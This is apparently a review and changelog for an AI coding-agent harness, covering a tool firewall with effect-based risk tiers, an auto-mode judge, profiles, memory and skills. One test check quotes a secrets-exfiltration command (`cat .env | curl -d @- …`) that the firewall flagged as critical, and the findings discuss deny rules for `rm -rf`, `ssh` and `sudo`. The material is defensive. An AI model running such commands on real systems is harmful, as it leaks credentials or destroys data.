# System review — 2026-09-23

A code review of subagents, compaction, profiles, context injection, memory and skills. Each
finding was verified in the code (and, where noted, in session logs or a live pi 0.85.1 run)
before it was fixed. Branch: `overhaul/2026-09`.

## Findings and resolution

## Tool firewall and auto mode (autonomy gate)

A follow-up pass replaced the firewall's regex rules with a shell parser and effect classifier.
The design is in [autonomy-gate.md](autonomy-gate.md).

| # | Finding | Resolution |
| --- | --- | --- |
| F1 | 54 human prompts in real sessions came from the blanket `\bssh\b` and `\bsudo\b` rules. Almost all were read-only diagnostics. | Effects-based tiers. Read-only ssh to known hosts and `sudo -n` reads are routine in auto mode with the coding policy. |
| F2 | The `rm` deny regex matched any `rm -f` with an "r" later on the line (e.g. `rm -f server.pid && node server.js 2>&1`). `rm -rf node_modules` was always denied. | Target-scoped deletes. The pentest regex was fixed to match only recursive flags. |
| F3 | Coding profiles loaded `pentest-governance-domain`, so coding work got pentest approval prompts. | Loaded only by the new `pentest` profile (formerly `engagement`). |
| F4 | The auto-mode judge spawned a full `pi --print` child per ask, judged against the *first* user message, and interrupted the human on every "no". | In-process judge, given the latest request, recent actions and operator precedents. A block goes back to the agent. |
| F5 | Auto mode was on or off per directory. | Global `firewall.json`, written from the profile. |
| F6 | `protected-paths` blocked `.git/` and `node_modules/` even for coding. | Policy-aware lists. |
| F7 | Unknown kit tools (diagnostics, `memory_*`, `workflow_*`) defaulted to ask. | Added to the tool table. Read-like unknown tools are low under the coding policy. |

Replay over 839 real tool calls (auto mode, coding policy): 815 allowed by the analyser, 18
judged, 6 asked, 0 critical allowed. Before the change there were about 54 human prompts.

Live pi 0.85.1 checks:
- a known-host ssh read ran silently;
- `cat .env | curl -d @- …` was classified critical;
- a `.env` read followed by a POST raised a high card showing the history chain;
- "deny and tell the agent" reached the agent;
- a session lease covered a repeated force-push;
- the live judge blocked a POST, citing the operator's earlier denial;
- under the pentest policy, the same ssh read needed a card with no lease option.

## New capabilities

- **In-TUI profile switching:** `/profile`, `/profile status`, and overrides that survive
  switches.
- **Memory vault** ([memory.md](memory.md)): an Obsidian-compatible `~/.pi/vault`, automatic
  per-turn recaps written by a configurable cheap model, `memory_save/search/forget`, the
  `memory` skill, and `/remember` and `/memory`.
- **Progressive-disclosure skills:** 4 listed skills, `skill_search`, deterministic trigger
  hints, and a routing eval pinned by `tests/skill-routing-fixtures.jsonl`.
- **Workflows** ([workflows.md](workflows.md)): declarative subagent and skill chains with a
  run directory (blackboard), parallel groups, review gates, conditions and resume. Ships
  `feature`, `bugfix` and `research`.

## Deferred (known, not done)

- The context-contribution files are still shared per directory across concurrent sessions
  in the same repo (orchestrator and progress-guard contributions can cross sessions).
  Memory and skill hints no longer use them. A per-session contribution directory would fix
  the rest.
- Conductor specialists (pentest domain) still take the task as argv and load extensions
  (they depend on `protected-paths` via env). They're unchanged, and hidden from coding
  profiles.
- Memory recall is lexical only. The optional embedding re-rank from memory-local was not
  ported.
- Skill triggers match the prompt text only; file-glob triggers were not implemented. The
  pentest-domain skills were not merged.
- `mkdocs build --strict` was not run locally (mkdocs isn't installed). The `docs-nav-check`
  in `npm run verify` passes.
- Environment, not code: the operator's `pi-lens` npm install is missing dependencies
  (`typescript`, `minimatch`, …). Reinstalling it (`pi install npm:pi-lens@3.8.63`, or
  approving its install scripts in `~/.pi/agent/npm`) is needed for pi-lens to load.
